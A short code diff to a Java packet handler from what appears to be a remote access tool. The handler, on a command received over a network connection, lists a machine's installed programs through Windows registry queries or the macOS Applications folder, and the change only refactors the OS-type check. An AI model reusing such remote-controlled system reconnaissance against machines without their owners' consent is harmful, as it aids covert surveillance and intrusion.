@@ -16,7 +16,7 @@ public class Packet81InstalledPrograms extends AbstractIncomingPacket {
 	public void read() throws Exception {
 		String path = Connection.readLine();
 		try {
-			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 				Process p;
 				if (path.equalsIgnoreCase("hklm")) {
 					p = Runtime.getRuntime().exec(new String[] { "reg", "query", "hklm\\software\\microsoft\\windows\\currentversion\\uninstall\\", "/s" });
@@ -44,7 +44,7 @@ public class Packet81InstalledPrograms extends AbstractIncomingPacket {
 					}
 				}
 				reader.close();
-			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
+			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
 				File[] apps = new File("/Applications/").listFiles();
 
 				for (File app : apps) {
